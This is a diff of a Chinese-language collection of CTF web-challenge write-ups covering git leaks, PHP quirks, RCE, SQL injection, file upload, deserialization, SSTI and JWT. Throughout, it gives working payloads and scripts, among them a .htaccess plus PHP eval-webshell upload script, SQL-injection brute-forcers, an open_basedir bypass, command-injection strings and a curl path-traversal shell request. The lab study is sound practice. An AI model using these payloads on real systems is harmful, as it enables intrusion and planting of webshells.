@@ -1,20 +1,12 @@
 ## 信息泄露
 
-### <font color='pink'>git信息泄露</font>
-
-+++
+### git信息泄露
 
 #### 前言
 
-+++
-
 本来是不想专门为信息泄露写一个wp的，觉得大型比赛可能不会有这种题目，但偶然间完整的做了一个git泄露题目，实在觉得有意思，就整理一个git信息泄露的题吧
 
-+++
-
-#### <font color='orange'>[BUGKU]source</font>
-
-+++
+#### [BUGKU]source
 
 进入页面，什么都没有，扫下后台发现git
 利用**ubuntu**的` wget -r http://114.67.175.224:14802/.git/`得到
@@ -45,11 +37,9 @@ e0b8e8e HEAD@{7}: commit (initial): this is index.html
 
 ![image-20220722221339620](D:\Typora\note\CTF\web\challenge.assets\image-20220722221339620.png)
 
-+++
 
-#### <font color='orange'>[ctfhub]Git泄露/Log</font>
 
-+++
+#### [ctfhub]Git泄露/Log
 
 弄环境和工具，极限最后30秒填完flag...
 进入题目，经典的`Where is flag?`
@@ -67,11 +57,9 @@ e0b8e8e HEAD@{7}: commit (initial): this is index.html
 
 ![image-20220722231505000](D:\Typora\note\CTF\web\challenge.assets\image-20220722231505000.png)
 
-+++
 
-#### <font color='orange'>[ctfhub]Git泄露/Stash</font>
 
-+++
+#### [ctfhub]Git泄露/Stash
 
 本题如题所示用到了`stash`
 前面的步骤和上题一样，就是`git show`找flag时根本找不到
@@ -101,21 +89,17 @@ stash@{0}: WIP on master: 345dcf2 add flag
 
 弹出了这个更改，然后查看一下就得到flag
 
-+++
 
-#### <font color='orange'>[ctfhub]Git泄露/index</font>
 
-+++
+#### [ctfhub]Git泄露/index
 
 最后一题反而最简单，和题目名一样，下载下来直接就有flag文件在里面
 `cat 148362260129772.txt`
 直接读就好了
 
-+++
 
-#### <font color='orange'>[BJDCTF2020]Mark loves cat</font>
 
-+++
+#### [BJDCTF2020]Mark loves cat
 
 进去的一个页面，点什么都没用，抓包和源码也没看出什么
 buu的环境，扫后台我又扫不了，试试**.git**，真有，然后用了之前的两种githack抓文件都没弄出index.php
@@ -181,13 +165,13 @@ echo "the flag is: ".$flag;
 
 
 
-+++
+
 
 
 
 ## php特性
 
-### <font color='orange'>[BJDCTF2020]Easy MD5</font>
+### [BJDCTF2020]Easy MD5
 
 进入网页，输入框随便输点值
 
@@ -258,11 +242,11 @@ md5强比较，传数组就ok
 
 0e是因为md5会默认0e开头后为纯数字的数据当作0
 
-+++
+
 
 ### [dsb]web签到
 
-+++
+
 
 ![image-20220522223824074](D:\Typora\note\CTF\web\challenge.assets\image-20220522223824074.png)
 
@@ -276,31 +260,9 @@ md5强比较，传数组就ok
 
 利用data协议写进了一句话木马，然后ls一下cat flagaaa就好了
 
+### 变量
 
 
-+++
-
-### <font color='orange'>php是世界上最好的语言</font>
-
-+++
-
-
-
-
-
-
-
-
-
-
-
-
-
-+++
-
-### <font color='orange'>变量</font>
-
-+++
 
 ```php
 flag In the variable ! <?php  
@@ -321,11 +283,11 @@ if(isset($_GET['args'])){
 
 最后用全局变量`GLOBALS`拿到flag
 
-+++
 
-### <font color='orange'>代码审计</font>
 
-+++
+### 代码审计
+
+
 
 进入页面，看源码，没有发现任何有用信息
 
@@ -426,11 +388,11 @@ echo $arr[1]; // baz
 
 `?kekeyy1[]=1&kekeyy2[]=2`
 
-+++
 
-### <font color='orange'>对方不想和你说话，并向你扔了一段代码</font>
 
-+++
+### 对方不想和你说话，并向你扔了一段代码
+
+
 
 ![image-20220526150942847](D:\Typora\note\CTF\web\challenge.assets\image-20220526150942847.png)
 
@@ -463,11 +425,11 @@ echo "$color, $size, $shape, $wddx_size\n";
 
 直接传`?a=`或者`?a=&b=`都可以
 
-+++
 
-### <font color='orange'>[BMZCTF]WEB_ezeval</font>
 
-+++
+### [BMZCTF]WEB_ezeval
+
+
 
 ```php
 <?php
@@ -521,11 +483,11 @@ eval($cmd);
 
 `cmd=hex2bin('73797374656d')('cat /flag');`
 
-+++
 
-### <font color='orange'>[ctfshow]红包题第二弹</font>
 
-+++
+### [ctfshow]红包题第二弹
+
+
 
 ```php
 <?php
@@ -576,11 +538,11 @@ eval($cmd);
 
 具体参考web55
 
-+++
 
-### <font color='orange'>[RoarCTF 2019]Easy Calc</font>
 
-+++
+### [RoarCTF 2019]Easy Calc
+
+
 
 (尽管ctfshow这类题刷的差不多，但每次刷赛题还是能学到新知识😓)
 访问页面
@@ -626,11 +588,11 @@ if(!isset($_GET['num'])){
 > 
 > ```
 
-+++
+
 
 ### [BJDCTF2020]ZJCTF，不过如此
 
-+++
+
 
 ```php
 <?php
@@ -687,11 +649,11 @@ function getFlag(){
 最终payload
 `http://7bd80b89-b26c-4543-840a-0049a4ae06bf.node4.buuoj.cn:81/?text=php://input&file=next.php&(\S*)=${getFlag()}&cmd=system('cat /flag');`
 
-+++
+
 
 ### [强网杯 2019]高明的黑客
 
-+++
+
 
 这题在buu上做实在是太折磨人🌶
 buu上的环境扫描快了就报429，而这题保守估计有几万条数据要处理，假设我一秒10条，也要两三个小时
@@ -829,11 +791,11 @@ if __name__ == '__main__':
 
 ```
 
-+++
 
-### <font color='orange'>[WUSTCTF2020]朴实无华</font>
 
-+++
+### [WUSTCTF2020]朴实无华
+
+
 
 打开网站，`hack me`和报错信息，手动扫后台发现**robots.txt**
 进入**/fAke_f1agggg.php**，在文件头发现**fl4g.php**
@@ -908,11 +870,9 @@ if (isset($_GET['get_flag'])){
 ?num=2e4&md5=0e215962017&get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
 ```
 
-+++
 
-### <font color='orange'>[安洵杯 2019]easy_web</font>
 
-+++
+### [安洵杯 2019]easy_web
 
 不知道为什么，这题无论是我自己用脚本弄出来的payload还是网上的payload都不行，起初以为是环境坏了，但是自己再本地搭的环境也不行，还是记个新思路吧
 源码
@@ -965,15 +925,9 @@ if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmo
 
 
 
+### [NPUCTF2020]ReadlezPHP
 
 
-
-
-+++
-
-### <font color='orange'>[NPUCTF2020]ReadlezPHP</font>
-
-+++
 
 ```php
 <?php
@@ -1041,11 +995,11 @@ echo serialize($c);
 ?>
 ```
 
-+++
+
 
 ### [极客大挑战 2019]RCE ME
 
-+++
+
 
 自己把这题想太简单了...
 
@@ -1141,11 +1095,11 @@ else:
 
 **暂不研究原理**
 
-+++
+
 
 ### [MRCTF2020]套娃
 
-+++
+
 
 打开页面查看源码发现hint
 
@@ -1242,11 +1196,11 @@ ZmpdYSZmXGI=
 
 得到flag~
 
-+++
+
 
 ### [FBCTF2019]RCEService
 
-+++
+
 
 感觉这题怪怪的，有奇怪的正则匹配，但是又不让看源码，至少得给个看源码的法子再来想想绕过吧...
 
@@ -1256,11 +1210,11 @@ ZmpdYSZmXGI=
 
 第二种方法就正则最大字符绕过，超过正则能匹配的最大数就可以了
 
-+++
+
 
 ### [Zer0pts2020]Can you guess it?
 
-+++
+
 
 ```php
 <?php
@@ -1343,11 +1297,9 @@ ASCII表范围为0-127，也就是我们传入128(%80)以上的数值，即可�
 
 `/index.php/config.php/%81?source`
 
-+++
+
 
 ### [GWCTF 2019]枯燥的抽奖
-
-+++
 
 直接给出了源码
 
@@ -1438,35 +1390,158 @@ echo $str;
 
 **可怕的暴力破解**
 
-+++
+### [SUCTF 2019]EasyWeb
+
+```php
+<?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES["file"])){
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $extension = substr($name, strrpos($name,".")+1);
+    if(preg_match("/ph/i",$extension)) die("^_^"); 
+        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
+    if(!exif_imagetype($tmp_name)) die("^_^"); 
+        $path= $userdir."/".$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET['_'];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)>18){
+    die('One inch long, one inch strong!');
+}
+
+if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
+    die('Try something else!');
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)>12) die("Almost there!");
+
+eval($hhh);
+?>
+```
+
+正则过滤的很死
+
+用个脚本检测下还剩下什么字符
+
+```php
+<?php
+for($a = 0; $a < 256; $a++){
+    if (!preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', chr($a))){
+        echo chr($a)." ";
+    }
+}
+?>
+```
+剩下
+> ! # $ % ( ) * + - / : ; < > ? @ \ ] ^ { }
+
+既然有异或符号，就一定可以异或出所有字符
+
+```php
+<?php
+$payload = '';
+$x = '_GET';
+for($i = 0; $i < strlen($x); $i++){
+    for ($j = 0; $j < 255; $j++){
+        $k = chr($j) ^ chr(255);
+        if ($k == $x[$i]) {
+            $payload .= '%'.dechex($j);
+        }
+    }
+}
+echo '%ff%ff%ff%ff^'.$payload;
+?>
+```
+
+```
+?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
+```
+
+构造`$_GET[%ff]`（构造`$_GET[%ff]($_GET[%fe])`会超出长度
+
+所以接下来只能利用给出的`get_the_flag`函数
+上传`.htaccess`文件，利用**base64**来绕过
+
+不知道为什么用bp上传一直有问题
+
+写个脚本上传
+
+```python
+import requests
+import hashlib
+import base64
+
+url ="http://3031af24-03a0-45ad-997c-8578e85b329e.node4.buuoj.cn:81/"
+padding = "?_=${%f8%f8%f8%f8^%a7%bf%bd%ac}{%f8}();&%f8=get_the_flag"
+myip=requests.get("http://ifconfig.me").text
+ip_md5 = hashlib.md5(myip.encode()).hexdigest()
+userdir="upload/tmp_"+ip_md5+"/"
+htaccess = b"""\x00\x00\x8a\x39\x8a\x39
+AddType application/x-httpd-php .txt
+php_value auto_append_file "php://filter/convert.base64-decode/resource=./xl.txt"
+"""
+shaw = b"\x00\x00\x8a\x39\x8a\x39"+b"00"+ base64.b64encode(b"<?php eval($_POST['cmd']);?>")
+files =[('file',('.htaccess',htaccess,'image/jpeg'))]
+
+res = requests.post(url=url+padding,files=files)
+files = [('file',('xl.txt',shaw,'image/jpeg'))]
+res = requests.post(url=url+padding,files=files)
+print("the path is:"+url+res.text)
+```
+
+按道理说最后用蚁剑的插件来绕过`open_basedir`权限限制，但我连上去就直接能看flag了（难道是默认开启了？
+
+或者利用
+
+```php
+cmd=mkdir('rot');chdir('rot');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(glob('*'));
+```
+
+这样就能看到flag，再打印就好啦
+
+[open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)
 
 ## 文件包含
 
-### <font color='orange'>[WMCTF2020]Make PHP Great Again(×)</font>
+### [WMCTF2020]Make PHP Great Again(×)
 
-+++
+
 
 from buuctf
 
 
 
-+++
 
-### <font color='orange'>[WMCTF2020]Make PHP Great Again2(×)</font>
 
-+++
+### [WMCTF2020]Make PHP Great Again2(×)
+
+
 
 from buuctf
 
 等我学好了条件竞争，就来治你们
 
-+++
 
-### <font color='orange'>SCTF 2018_Simple PHP Web</font>
 
-+++
+### SCTF 2018_Simple PHP Web
 
-查看url http://www.bmzclub.cn:24314/?f=login.php
+
+
+查看url `http://www.bmzclub.cn:24314/?f=login.php`
 
 很像文件包含，试了一下`?f=php://filter/convert.base64-encode/resource=login.php`发现确实是
 
@@ -1474,11 +1549,11 @@ from buuctf
 
 看作者的wp好像这时非预期，或者题目被改了
 
-+++
+
 
 ### [BSidesCF 2020]Had a bad day
 
-+++
+
 
 ![image-20220725221848878](D:\Typora\note\CTF\web\challenge.assets\image-20220725221848878.png)
 
@@ -1488,7 +1563,7 @@ from buuctf
 
 ![image-20220725222117848](D:\Typora\note\CTF\web\challenge.assets\image-20220725222117848.png)
 
-+++
+
 
 为什么不加`.php`？因为经过测试发现会自动加上，找到属于php的源码
 
@@ -1520,11 +1595,11 @@ $file = $_GET['category'];
 
 得到flag
 
-+++
+
 
 ### [NPUCTF2020]ezinclude(include特殊用法)
 
-+++
+
 
 用cookie中的hash登陆后发现`/flflflflag.php`
 
@@ -1592,11 +1667,11 @@ print(bak.text)
 
 <font color='pink'>**又是一个偏僻的小知识点**</font>
 
-+++
+
 
 ### [HarekazeCTF2019]encode_and_encode（json小技巧）
 
-+++
+
 
 ```php
 <?php
@@ -1659,13 +1734,13 @@ echo json_encode(['content' => $content]);
 
 
 
-+++
+
 
 ## RCE
 
-### <font color='orange'>[GXYCTF2019]Ping Ping Ping(绕过flag和空格)</font>
+### [GXYCTF2019]Ping Ping Ping(绕过flag和空格)
 
-+++
+
 
 进入页面先ls一下
 
@@ -1685,13 +1760,13 @@ RCE中绕过空格的办法
 
 ![image-20220522193246171](D:\Typora\note\CTF\web\challenge.assets\image-20220522193246171.png)
 
-+++
 
-+++
 
-### <font color='orange'>[GXYCTF2019]禁止套娃</font>
 
-+++
+
+### [GXYCTF2019]禁止套娃
+
+
 
 进入页面只有一个**flag在哪里呢？**，抓包也没东西，那就扫后台
 然后一种429，这版本的dirsearch又好像没了-s参数，一直扫不出来，没办法，自己人工扫
@@ -1743,11 +1818,11 @@ array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=>
 show_source(next(array_reverse(scandir(pos(localeconv())))));
 ```
 
-+++
+
 
 ### [红明谷CTF 2021]write_shell
 
-+++
+
 
 很简单的命令执行绕过
 
@@ -1810,17 +1885,17 @@ payload
 
 
 
-+++
 
-+++
 
-+++
+
+
+
 
 ## SQL
 
-### <font color='orange'>[极客大挑战 2019]FinalSQL(异或sql)</font>
+### [极客大挑战 2019]FinalSQL(异或sql)
 
-+++
+
 
 该届极客大挑战有几个SQL，其余几题记录再来one note上
 
@@ -1858,11 +1933,11 @@ py脚本还不会，只能暂时放这了，py学会了再来做吧
 
 curl -X POST -d "echo;cat vdir" http://1.116.210.145:28794/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
 
-+++
 
-### <font color='orange'>ISCC-EasySQL(mysql8&虚拟表绕过)</font>
 
-+++
+### ISCC-EasySQL(mysql8&虚拟表绕过)
+
+
 
 题目信息
 
@@ -1934,11 +2009,11 @@ password并不知道，于是考虑是不是又是sql注入
 
 直接union select或者values row都可以(group by *** with rollup想必也可以)，于是得到flag
 
-+++
 
-+++
 
-### <font color='orange'>CTFshow-web10(虚拟表绕过)</font>
+
+
+### CTFshow-web10(虚拟表绕过)
 
 进入题目
 
@@ -1988,11 +2063,11 @@ group by是将该列相同的合在一个
 
 最关键的就是不用union和select!
 
-+++
 
-+++
 
-### <font color='orange'>CTFshow-web11(本地session绕过)</font>
+
+
+### CTFshow-web11(本地session绕过)
 
 进入题目，源码已给出
 
@@ -2004,11 +2079,11 @@ group by是将该列相同的合在一个
 
 获得flag
 
-+++
 
-### <font color='orange'>[强网杯 2019]随便注(有意思的思路和方法)</font>
 
-+++
+### [强网杯 2019]随便注(有意思的思路和方法)
+
+
 
 `1' or 1=1;#`  证明存在sql注入
 
@@ -2088,9 +2163,9 @@ group by是将该列相同的合在一个
 
 打开文件，查看文件~
 
-+++
 
-### <font color='orange'>Twice SQL Injection (二次注入)</font>
+
+### Twice SQL Injection (二次注入)
 
 二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入
 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询
@@ -2130,11 +2205,11 @@ group by是将该列相同的合在一个
 
 ![image-20220523224539637](D:\Typora\note\CTF\web\challenge.assets\image-20220523224539637.png)
 
-+++
 
-### <font color='orange'>[ctfshow]web8</font>
 
-+++
+### [ctfshow]web8
+
+
 
 ![image-20220714204101311](D:\Typora\note\CTF\web\challenge.assets\image-20220714204101311.png)
 
@@ -2194,11 +2269,9 @@ for i in range(1,666):
             break
 ```
 
-+++
 
-### <font color='orange'>[ctfshow]web14</font>
 
-+++
+### [ctfshow]web14
 
 
 
@@ -2218,11 +2291,11 @@ for i in range(1,666):
 
 
 
-+++
 
-### <font color='orange'>[CISCN2019 华北赛区 Day2 Web1]Hack World</font>
 
-+++
+
+
+### [CISCN2019 华北赛区 Day2 Web1]Hack World
 
 ![image-20220724162707744](D:\Typora\note\CTF\web\challenge.assets\image-20220724162707744.png)
 
@@ -2269,11 +2342,11 @@ if成立则返回1，反之则是0
 
 脚本就上面稍微改改就好
 
-+++
+
 
 ### [WUSTCTF2020]颜值成绩查询
 
-+++
+
 
 这题确确实实让我警醒了
 <font color='red'>**异或真的有必要出现在sql里面吗？？？？如果可以异或了，我还需要异或？？？这前面的1^不要了不也可以正常注入？？？**</font>
@@ -2397,19 +2470,76 @@ xl"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))fr
 
 ```
 flag{28fefbfe-67e9-48b3-8ea0-6d81295761c4}
+flag{3d63b193-8a81-4b84-a57d-21e1fde7
 ```
 
+### [GYCTF2020]Ezsqli
 
+之前buu留了一堆sql没做，现在补的真折磨
 
-+++
+直接是id，所以没有单引号，可以用`if` `^`或者直接上语句嘛。。
+
+```sql
+if(0,1,2) # 0 = false,所以是2
+0^1
+(ascii(substr(database(),1,1))>32)
+```
+
+然后`information_schema`被过滤了，就是常规的注表名和无列名注入了（直接猜列名为flag也可以
+
+[ctf无列名注入小结](https://k1te.cn/2021/05/19/no-column-sql-injection/)
+
+但是这题只能利用比较
+
+```sql
+(select * from f1ag_1s_h3r3_hhhhh)>(select 1,'A')
+```
+
+实在是不想写sql了，抄个脚本吧
+
+```python
+import requests
+import time
+
+url = "http://7afc95b2-c918-499c-a5d3-9637042a4bc2.node4.buuoj.cn:81/index.php"
+payload1 = "if(ascii(substr((select(flag)from(f1ag_1s_h3r3_hhhhh)),"
+payload2 = ",1))="
+payload3 = ",1,2)"
+name = ""
+dic = "qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890-{}"
+for i in range(1,50):
+    for j in dic:
+        payload = payload1+str(i)+payload2+str(ord(j))+payload3
+        data = {'id':payload}
+        time.sleep(0.05)
+        s = requests.post(url,data=data).text
+        if ("Nu1L" in s):
+            name += j
+            print(name)
+            break
+```
+
+### [NCTF2019]SQLi
+
+又是sql🤮
+
+很经典的注入**payload**
+
+```sql
+username=\&passwd=||/**/1;%00
+```
+
+偷个脚本注密码登陆就行
+
+> you_will_never_know7788990
 
 ## upload
 
-+++
+
 
 ### [WUSTCTF2020]CV Maker
 
-+++
+
 
 注册之后有文件上传入口
 
@@ -2433,9 +2563,7 @@ flag{28fefbfe-67e9-48b3-8ea0-6d81295761c4}
 
 ## 各种框架漏洞
 
-### <font color='orange'>[GWCTF 2019]我有一个数据库</font>
-
-+++
+### [GWCTF 2019]我有一个数据库
 
 首先，进入网页
 
@@ -2469,11 +2597,11 @@ phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag
 
 ![image-20220515190720040](D:\Typora\note\CTF\web\challenge.assets\image-20220515190720040.png)
 
-+++
+
 
 ## 杂乱
 
-### <font color='orange'>CTFshow-WEB12</font>
+### CTFshow-WEB12
 
 进入
 
@@ -2505,11 +2633,9 @@ phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag
 
 得到flag
 
-+++
 
-### <font color='orange'>[pwnthebox]网页读取器</font>
 
-+++
+### [pwnthebox]网页读取器
 
 进入题目
 
@@ -2523,49 +2649,13 @@ phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag
 
 `http://127.0.0.1/flag#@example.com`
 
-+++
-
-### <font color='orange'>atchp</font>
-
-+++
 
 
 
 
+### [ASIS 2019]Unicorn shop(×)
 
 
-
-
-
-
-
-
-
-+++
-
-### <font color='orange'>达拉崩吧大冒险</font>
-
-+++
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-+++
-
-### <font color='orange'>[ASIS 2019]Unicorn shop(×)</font>
-
-+++
 
 此题过于抽象，以至于不想写wp，什么时候有闲心了再写写吧
 
@@ -2573,11 +2663,11 @@ phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag
 
 
 
-+++
 
-### <font color='orange'>[MRCTF2020]PYWebsite</font>
 
-+++
+### [MRCTF2020]PYWebsite
+
+
 
 buu两千解的题，竟然这么简单？？？
 就是一个XFF伪造一下就好了
@@ -2585,11 +2675,11 @@ buu两千解的题，竟然这么简单？？？
 
 顺便吐槽一下bp，经常出问题，反正也是抓下包，以后用postwoman代替算了
 
-+++
+
 
 ### [BJDCTF2020]EasySearch
 
-+++
+
 
 打开网站输入，抓包都没什么发现，buu又不能扫目录
 看了wp才知道当时放出来一个hint，访问 index.php.swp 即可获得源码
@@ -2656,22 +2746,22 @@ for i in range(10000000):
 `<!--#exec cmd="ls" -->`
 这样就可以随意rce了，常规位置没找到flag，可以find一下再cat就行
 
-+++
+
 
 ### [BSidesCF 2019]Kookie
 
-+++
+
 
 题目是**Kookie**，很像cookie，打开是一个登录框要我们以admin登录
 cookie传一个`username=admin password=admin`，然后登录，登录成功得到flag
 
 
 
-+++
+
 
 ### [b01lers2020]Welcome to Earth
 
-+++
+
 
 前面就是抓包各种找入口，没必要多说，最后一步有点意思
 
@@ -2710,11 +2800,11 @@ for i in item:
 
 **permutations**就是对数组进行全排列，然后返回的是全排列之后的值，返回类型是一个object
 
-+++
+
 
 ### [SUCTF 2019]Pythonginx
 
-+++
+
 
 编码题
 
@@ -2798,13 +2888,13 @@ server { listen 80; location / { try_files $uri @app; } location @app { include 
 file://suctf.ℭc/usr/fffffflag
 ```
 
-+++
+
 
 ## unserialize
 
-### <font color='orange'>[极客大挑战 2019]PHP</font>
+### [极客大挑战 2019]PHP
 
-+++
+
 
 提示了源码泄露，直接`/www.zip`拿到源码
 
@@ -2905,11 +2995,9 @@ class Name{
 O%3A4%3A"Name"%3A3%3A%7Bs%3A14%3A"%00Name%00username"%3Bs%3A5%3A"admin"%3Bs%3A14%3A"%00Name%00password"%3Bi%3A100%3B%7D
 ```
 
-+++
 
-### <font color='orange'>[网鼎杯 2020 青龙组]AreUSerialz</font>
 
-+++
+### [网鼎杯 2020 青龙组]AreUSerialz
 
 ```php
 <?php
@@ -3028,11 +3116,9 @@ echo(serialize(new FileHandler()));
 
 然后发现权限不够，而写入`index.php`又不行，这种方法看来不行
 
-+++
 
-### <font color='orange'>[安洵杯 2019]easy_serialize_php</font>
 
-+++
+### [安洵杯 2019]easy_serialize_php
 
 #### 获取信息
 
@@ -3120,11 +3206,11 @@ POST:_SESSION[user]=phpphpflagflagflagflag&_SESSION[function]=;s:8:"function";s:
 得到flag
 ```
 
-+++
+
 
 ### <font color='green'>[MRCTF2020]Ezpop</font>
 
-+++
+
 
 做的途中查魔术方法，构造链子用了很久，但最后还是看了WP(就差一步)，但是这题可能真正的改变我对反序列化的做法，让我的做法能更加优雅，思路也能更加清晰了
 
@@ -3224,22 +3310,22 @@ echo serialize($a);
 
 这题真的很有意思，算是我挖链子的启蒙了吧
 
-+++
+
 
 ### [天翼杯 2021\]esay_eval
 
-+++
+
 
 from NSSCTF
 反序列化＋redis提权
 
-+++
+
 
 ## 框架
 
-+++
 
-### <font color='orange'>[护网杯 2018]easy_tornado</font>
+
+### [护网杯 2018]easy_tornado
 
 ![image-20220724125845152](D:\Typora\note\CTF\web\challenge.assets\image-20220724125845152.png)
 
@@ -3263,15 +3349,33 @@ from NSSCTF
 
 拿到`cookie_secret`，构造一下就能访问到flag了
 
-+++
+### [GYCTF2020]EasyThinking
+
+根据题目，是tp框架
+
+![image-20221226000032498](challenge.assets/image-20221226000032498.png)
+
+随便输点东西报错，找该版本漏洞
+
+[ThinkPHP6.0任意文件写](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP6/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99.md)
+
+将session改为`aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`，然后登陆账号，在搜索框写入一句话木马
+
+然后访问`runtime/session/sess_aaaaaaaaaaaaaaaaaaaaaaaaaaaa.php`
+
+连接蚁剑，利用插件**绕过disable_function**
+
+![image-20221226000840297](challenge.assets/image-20221226000840297.png)
+
+
 
 ## SSTL
 
-+++
 
-### <font color='orange'>[BJDCTF2020]The mystery of ip</font>
 
-+++
+### [BJDCTF2020]The mystery of ip
+
+
 
 超简单的SSTL
 进入网站，点击flag，有一个ip，hint提示的是为什么能知道你的ip(猜测就是后台获取呗)
@@ -3284,11 +3388,11 @@ from NSSCTF
 最后的payload
 `{{system('cat /flag')}}`
 
-+++
+
 
 ### [CSCCTF 2019 Qual]FlaskLight
 
-+++
+
 
 纯SSTI，直接上脚本
 
@@ -3330,7 +3434,7 @@ payload
 
 ### [RootersCTF2019]I_<3_Flask
 
-+++
+
 
 进来就一个flask，源码 抓包什么都没发现
 buu也不好扫目录，就去看了看**wp**
@@ -3364,13 +3468,13 @@ xlccccc@xl-pc:~/Arjun/arjun$ python3 __main__.py -u http://76a629e0-3136-40c0-bf
 
 
 
-+++
+
 
 ## JWT
 
 ### [HFCTF2020]EasyLogin
 
-+++
+
 
 纯的JWT伪造，签名改为none，改了算法，就把`secretid改为[]`相当于空，末端签名空着就行
 
@@ -3378,11 +3482,11 @@ xlccccc@xl-pc:~/Arjun/arjun$ python3 __main__.py -u http://76a629e0-3136-40c0-bf
 
 `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEiLCJpYXQiOjE2NjI5MTA1MzZ9.`
 
-+++
+
 
 ### [watevrCTF-2019]Cookie Store
 
-+++
+
 
 更纯的jwt伪造，直接改钱就完事
 
